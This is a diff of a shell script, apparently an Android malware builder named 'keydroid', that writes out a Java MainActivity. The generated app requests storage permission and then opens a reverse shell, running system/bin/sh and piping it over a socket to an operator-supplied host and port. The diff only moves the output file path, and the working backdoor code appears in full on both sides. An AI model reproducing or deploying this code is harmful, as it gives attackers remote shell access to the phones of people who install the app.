@@ -48,109 +48,109 @@ printf "\n"
 
 createapp() {
 
-printf "package com.keydroid;\n" > app/app/src/main/java/com/MainActivity.java
+printf "package com.keydroid;\n" > app/app/src/main/java/com/keydroid/MainActivity.java
 
-printf "import android.content.Context;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.os.Environment;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.FileInputStream;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.FileOutputStream;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.InputStreamReader;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.File;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.BufferedReader;		\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.IOException;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.InputStream;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.io.OutputStream;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import java.net.Socket;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.app.Activity;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.util.Log;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.view.Menu;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.widget.TextView;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.database.Cursor;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.net.Uri;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "public class MainActivity extends Activity {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "   @Override\n" >> app/app/src/main/java/com/MainActivity.java
-printf "   protected void onCreate(Bundle savedInstanceState) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "      super.onCreate(savedInstanceState);\n" >> app/app/src/main/java/com/MainActivity.java
-printf "      setContentView(R.layout.activity_main);\n" >> app/app/src/main/java/com/MainActivity.java
-printf "      new Thread(new Runnable(){\n" >> app/app/src/main/java/com/MainActivity.java
-printf "			@Override\n" >> app/app/src/main/java/com/MainActivity.java
-printf "			public void run() {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				try {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "                                        checkperm();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					Log.e(\"Error\", e.getMessage());\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "			}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		}).start();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "}\n" >> app/app/src/main/java/com/MainActivity.java
-printf " 	public void reverseShell() throws Exception {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		final Process process = Runtime.getRuntime().exec(\"system/bin/sh\");\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		Socket socket = new Socket(\"%s\", %s);\n" $host $port >> app/app/src/main/java/com/MainActivity.java
-printf "		forwardStream(socket.getInputStream(), process.getOutputStream());\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		forwardStream(process.getInputStream(), socket.getOutputStream());\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		forwardStream(process.getErrorStream(), socket.getOutputStream());\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		process.waitFor();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		socket.getInputStream().close();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		socket.getOutputStream().close();\n" >> app/app/src/main/java/com/MainActivity.java
+printf "import android.content.Context;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.os.Environment;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.FileInputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.FileOutputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.InputStreamReader;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.File;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.BufferedReader;		\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.IOException;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.InputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.io.OutputStream;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import java.net.Socket;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.app.Activity;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.util.Log;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.view.Menu;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.widget.TextView;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.database.Cursor;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.net.Uri;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "public class MainActivity extends Activity {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "   @Override\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "   protected void onCreate(Bundle savedInstanceState) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "      super.onCreate(savedInstanceState);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "      setContentView(R.layout.activity_main);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "      new Thread(new Runnable(){\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "			@Override\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "			public void run() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "                                        checkperm();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					Log.e(\"Error\", e.getMessage());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "			}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		}).start();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf " 	public void reverseShell() throws Exception {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		final Process process = Runtime.getRuntime().exec(\"system/bin/sh\");\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		Socket socket = new Socket(\"%s\", %s);\n" $host $port >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		forwardStream(socket.getInputStream(), process.getOutputStream());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		forwardStream(process.getInputStream(), socket.getOutputStream());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		forwardStream(process.getErrorStream(), socket.getOutputStream());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		process.waitFor();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		socket.getInputStream().close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		socket.getOutputStream().close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
-printf "	}\n" >> app/app/src/main/java/com/MainActivity.java
+printf "	}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
 
 
-printf "public void checkperm() {\n" >> app/app/src/main/java/com/MainActivity.java
+printf "public void checkperm() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
-printf "       if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.WRITE_EXTERNAL_STORAGE\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/MainActivity.java
+printf "       if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.WRITE_EXTERNAL_STORAGE\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
-printf "try {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					reverseShell();\n" >> app/app/src/main/java/com/MainActivity.java
+printf "try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					reverseShell();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
                                   
-printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					Log.e(\"Error\", e.getMessage());\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				}\n" >> app/app/src/main/java/com/MainActivity.java
+printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					Log.e(\"Error\", e.getMessage());\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
 
-printf "        } else {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.WRITE_EXTERNAL_STORAGE\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/MainActivity.java
-printf "          checkperm();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "        }\n" >> app/app/src/main/java/com/MainActivity.java
-printf "}\n" >> app/app/src/main/java/com/MainActivity.java
+printf "        } else {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.WRITE_EXTERNAL_STORAGE\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "          checkperm();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "        }\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
 
-printf "	private static void forwardStream(final InputStream input, final OutputStream output) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		new Thread(new Runnable() {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "			@Override\n" >> app/app/src/main/java/com/MainActivity.java
-printf "			public void run() {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				try {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					final byte[] buf = new byte[4096];\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					int length;\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					while ((length = input.read(buf)) != -1) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "						if (output != null) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "							output.write(buf, 0, length);\n" >> app/app/src/main/java/com/MainActivity.java
-printf "							if (input.available() == 0) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "								output.flush();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "							}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "						}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				} finally {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					try {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "						input.close();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "						output.close();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					} catch (IOException e) {\n" >> app/app/src/main/java/com/MainActivity.java
-printf "					}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "				}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "			}\n" >> app/app/src/main/java/com/MainActivity.java
-printf "		}).start();\n" >> app/app/src/main/java/com/MainActivity.java
-printf "	}\n" >> app/app/src/main/java/com/MainActivity.java
+printf "	private static void forwardStream(final InputStream input, final OutputStream output) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		new Thread(new Runnable() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "			@Override\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "			public void run() {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					final byte[] buf = new byte[4096];\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					int length;\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					while ((length = input.read(buf)) != -1) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "						if (output != null) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "							output.write(buf, 0, length);\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "							if (input.available() == 0) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "								output.flush();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "							}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "						}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				} catch (Exception e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				} finally {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					try {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "						input.close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "						output.close();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					} catch (IOException e) {\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "					}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "				}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "			}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "		}).start();\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
+printf "	}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
-printf "}\n" >> app/app/src/main/java/com/MainActivity.java
+printf "}\n" >> app/app/src/main/java/com/keydroid/MainActivity.java
 
 }
 
